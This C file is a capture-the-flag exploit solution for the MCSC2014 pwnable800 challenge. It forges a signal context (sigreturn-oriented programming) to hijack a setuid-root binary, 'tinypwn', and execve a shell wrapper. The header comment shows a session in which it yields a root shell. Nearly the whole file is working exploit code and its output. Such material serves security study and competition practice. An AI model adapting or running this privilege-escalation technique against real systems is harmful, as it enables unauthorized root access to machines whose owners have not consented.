/* pwnable800 solution (MCSC2014)
 * before executing this exploit , you should write and compile a wrapper named badass
 * thus execve("./badass",...) will be executed successefully 
 * be carefull about tty buffering  , the shell may be closed immediatly 
 * 
 * s36@hacker:~/MCSC2014/pwnables/p800 on master # ls -lia tinypwn                                                    ✭
 * 1323462 -rwsrwsr-x 1 root root 1107 juin  10 15:05 tinypwn
 * s36@hacker:~/MCSC2014/pwnables/p800 on master # id                                                                 ✭
 * uid=1000(s36) gid=1000(s36) groups=1000(s36),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lpadmin),125(sambashare),130(sbuild)
 * s36@hacker:~/MCSC2014/pwnables/p800 on master # ./pwn800_sol                                                       ✭
 * bash-4.2# whoami
 * root
 *
 */

#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>
#include <asm/sigcontext.h>
 
#define SIGRETURN 119
#define SYSCALL 0x8048107
#define exec 0x80480ef   /* badass */


unsigned long get_stack_addr()
{
	unsigned long esp;
	__asm__ volatile ("movl %%esp,%%eax\n\t"
			  "movl %%eax,%0"
			  :"=r"(esp)
		);
	return esp;
}
int main(int argc,char **argv)
{
        char *args[4096]={0};
        unsigned char input[4096*2]={0};
        int i;
        int fds[2];
        struct sigcontext scon;
        
        memset(&scon,0,sizeof(struct sigcontext));

        scon.eax = 11;		/* execve syscall no  */
        scon.ebx = exec;	/* "badass" the wrapper of our shellcode  */
	scon.ecx = 0;
	scon.edx = 0;
	scon.esp = scon.ebp = get_stack_addr(); /* must be a writeable section */
	scon.eip = SYSCALL;			/*  0xabad1dea; our new EIP control */
	scon.cs = 0x23;
	scon.ss = scon.ds = scon.es = 0x2B;
	
	
        for(i=1;i<4096;i+=1) 
                args[i]="\x41";
        
        pipe(fds);

        dup2(fds[0],0);
 
	
        memset(input,0xcc,sizeof(input));
        memcpy(&input[4],&scon,sizeof(struct sigcontext));

	/* We control EIP by "int $0x80;ret"  */
	*(void**)(input) = SYSCALL;
	
	/* Make read() returns the sigreturn syscall number  */
        write(fds[1],input,SIGRETURN);
	
        args[0] = "./tinypwn";
        args[4096] = NULL;
        execve(args[0],args,NULL);
        return 0;
}
